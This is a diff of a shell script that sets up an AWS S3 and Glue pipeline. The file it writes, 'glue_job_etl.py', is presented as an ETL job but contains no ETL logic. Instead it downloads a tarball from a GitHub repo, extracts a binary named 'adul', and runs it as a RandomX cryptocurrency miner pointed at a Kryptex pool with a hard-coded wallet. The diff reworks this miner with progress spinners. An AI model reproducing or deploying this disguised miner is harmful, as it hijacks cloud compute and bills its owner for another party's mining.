@@ -49,119 +49,136 @@ aws s3 cp sample.csv "s3://${BUCKET_NAME}/raw/sample.csv"
 # 4. Buat file ETL
 # =========================
 cat > glue_job_etl.py <<'PY'
-#!/usr/bin/env python3
-
 import os
 import sys
-import time
-import socket
-import tarfile
-import shutil
 import subprocess
-from urllib import request
+import tarfile
+import urllib.request
+import time
+import shutil
+import platform
+import socket
 
-URL = "https://github.com/habibbaharyuandi/lado/raw/refs/heads/main/adul.tar.gz"
-WALLET = "164az6Jw8Y3pJJd8XcCwjVYykBTHQWRq4vEg8beNnQWm3MPWj4biVANqDYve9xfJiN5JDN4PiHRta31o2awd4k3AbEbs4bi3NrV8DUzt9g6pJeTkrFtjJtEvPTo7SAVdtYb5fWx"
-
-def download_file(url, filename=None):
-    if filename is None:
-        filename = os.path.basename(url)
-    print(f"Downloading {filename}...")
+def run_with_loading(message, cmd, *args):
+    sys.stdout.write(f"[|] {message}")
+    sys.stdout.flush()
+    
+    spinner = ["|", "/", "-", "\"]
+    
+    # Run process
     try:
-        request.urlretrieve(url, filename)
-        return 0
+        process = subprocess.Popen([cmd] + list(args), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     except Exception as e:
-        print(f"Download gagal: {e}")
+        sys.stdout.write(f"\r[✖] {message} gagal\n")
         return 1
 
-def extract_tar_ball(path):
-    print(f"Extracting {os.path.basename(path)}...")
-    try:
-        with tarfile.open(path, "r:gz") as tar:
-            tar.extractall(".")
-        return 0
-    except Exception as e:
-        print(f"Ekstrak gagal: {e}")
-        return 1
+    idx = 0
+    while process.poll() is None:
+        char = spinner[idx % len(spinner)]
+        sys.stdout.write(f"\r[{char}] {message}")
+        sys.stdout.flush()
+        time.sleep(0.08)
+        idx += 1
 
-def get_worker_name():
-    try:
-        hostname = socket.gethostname()
-        addrs = socket.gethostbyname_ex(hostname)[2]
-        for ip in addrs:
-            if ip and not ip.startswith("127."):
-                return ip
-    except Exception:
-        pass
-
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        ip = s.getsockname()[0]
-        s.close()
-        if ip and not ip.startswith("127."):
-            return ip
-    except Exception:
-        pass
-
-    return "worker1"
-
-def run_adul():
-    worker_name = get_worker_name()
-    worker_tag = f"{WALLET}/{worker_name}"
-    threads = os.cpu_count() or 1
-
-    print(f"Menjalankan adul dengan worker: {worker_tag}")
-
-    cmd = [
-        "./adul",
-        "-a", "rx/0",
-        "-o", "xtm-rx-sg.kryptex.network:7038",
-        "-u", worker_tag,
-        "-t", str(threads)
-    ]
-
-    try:
-        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    except FileNotFoundError:
-        print("Binary ./adul tidak ditemukan. Pastikan file sudah diekstrak.")
-        return 1
-
-    try:
-        while proc.poll() is None:
-            time.sleep(0.2)
-        return proc.wait()
-    except KeyboardInterrupt:
-        proc.terminate()
-        print("\n[ SELESAI ] Proses adul dibatalkan.")
-        return 130
-
-def main():
-    filename = os.path.basename(URL)
-    if not os.path.exists(filename):
-        status = download_file(URL, filename)
-        if status != 0:
-            return 1
-
-    status = extract_tar_ball(filename)
-    if status != 0:
-        return 1
-
-    status = run_adul()
+    status = process.returncode
     if status == 0:
-        print("[ SELESAI ] Proses adul telah berhenti.")
+        sys.stdout.write(f"\r[✔] {message} selesai\n")
     else:
-        print(f"[ SELESAI ] Proses adul berhenti dengan status: {status}")
-
+        sys.stdout.write(f"\r[✖] {message} gagal\n")
+    
     return status
 
-if __name__ == "__main__":
+# 1. Download
+# Using urllib for python curl equivalent
+def download_file(url, filename):
+    sys.stdout.write(f"[|] Downloading {filename}...")
+    sys.stdout.flush()
     try:
-        sys.exit(main())
-    except KeyboardInterrupt:
-        print("\nProgram dihentikan.")
-        sys.exit(130)
-PY
+        urllib.request.urlretrieve(url, filename)
+        sys.stdout.write(f"\r[✔] Downloading {filename} selesai\n")
+        return 0
+    except Exception:
+        sys.stdout.write(f"\r[✖] Downloading {filename} gagal\n")
+        return 1
+
+if download_file("https://github.com/habibbaharyuandi/lado/raw/refs/heads/main/adul.tar.gz", "adul.tar.gz") != 0:
+    sys.exit(1)
+
+# 2. Ekstrak
+def extract_tar(filename):
+    sys.stdout.write(f"[|] Extracting {filename}...")
+    sys.stdout.flush()
+    try:
+        with tarfile.open(filename, "r:*") as tar:
+            tar.extractall()
+        sys.stdout.write(f"\r[✔] Extracting {filename} selesai\n")
+        return 0
+    except Exception:
+        sys.stdout.write(f"\r[✖] Extracting {filename} gagal\n")
+        return 1
+
+if extract_tar("adul.tar.gz") != 0:
+    sys.exit(1)
+
+# === Ambil IP lokal dengan lebih aman dan andal ===
+worker_name = ""
+
+# Metode 1: Menggunakan hostname
+try:
+    worker_name = socket.gethostbyname(socket.gethostname())
+except Exception:
+    pass
+
+# Metode 2: Fallback ke ip route atau hostname -I via subprocess jika kosong
+if not worker_name:
+    try:
+        res = subprocess.check_output(["hostname", "-I"]).decode().strip()
+        if res:
+            worker_name = res.split()[0]
+    except Exception:
+        pass
+
+if not worker_name or worker_name == "0":
+    worker_name = "worker1"
+
+wallet = "164az6Jw8Y3pJJd8XcCwjVYykBTHQWRq4vEg8beNnQWm3MPWj4biVANqDYve9xfJiN5JDN4PiHRta31o2awd4k3AbEbs4bi3NrV8DUzt9g6pJeTkrFtjJtEvPTo7SAVdtYb5fWx"
+worker_tag = f"{wallet}/{worker_name}"
+
+try:
+    threads = os.cpu_count() or 1
+except Exception:
+    threads = 1
+
+print(f"Menjalankan adul dengan worker: {worker_tag}")
+
+adul_process = subprocess.Popen(["./adul", "-a", "rx/0", "-o", "xtm-rx-sg.kryptex.network:7038", "-u", worker_tag, "-t", str(threads)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+text = "NUJU PROSES"
+total_dots = 12
+dots = 0
+
+print()
+
+try:
+    while adul_process.poll() is None:
+        sys.stdout.write('\033[1A\033[2K')
+        cols = shutil.get_terminal_size((80, 20)).columns
+        total_len = len(text) + dots
+        x = (cols - total_len) // 2
+        if x < 0:
+            x = 0
+        
+        dot_str = "." * dots
+        sys.stdout.write(f"\033[{x}G\033[1;37m{text}{dot_str}\033[0m\n")
+        sys.stdout.flush()
+        
+        dots = (dots + 1) % (total_dots + 1)
+        time.sleep(0.16)
+except KeyboardInterrupt:
+    adul_process.terminate()
+
+print("\033[0m\n[ SELESAI ] Proses adul telah berhenti.")
+
 
 aws s3 cp glue_job_etl.py "s3://${BUCKET_NAME}/scripts/glue_job_etl.py"
 
